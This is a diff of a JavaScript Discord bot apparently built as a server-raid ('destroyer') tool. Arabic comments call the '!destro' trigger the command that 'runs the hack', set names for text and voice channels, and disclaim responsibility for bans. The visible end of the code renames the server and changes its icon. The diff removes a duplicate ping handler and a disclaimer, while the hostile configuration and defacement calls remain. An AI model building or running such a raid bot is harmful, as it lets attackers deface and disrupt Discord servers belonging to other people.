@@ -4,16 +4,6 @@ const client = new Discord.Client();
 client.on('ready', () => {
     console.log('I am ready!');
 });
- 
-client.on('message', message => {
-    if (message.content === 'zg') {
-        message.reply('pong');
-      }
-});
- 
-const Discord = require("discord.js");
-const client = new Discord.Client();
-//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
 const x_x = "!destro" //هنا تحط الامر اللي يشغل الهاك
 const teext = "msh ana y destro" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
 const vooice = "msh ana y destro" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
@@ -48,4 +38,4 @@ if (message.content === x_x) {
    hack.setIcon(pic)
    hack.setName(namee)})})})}});
    
-   client.login(process.env.BOT_TOKEN);
+client.login(process.env.BOT_TOKEN);
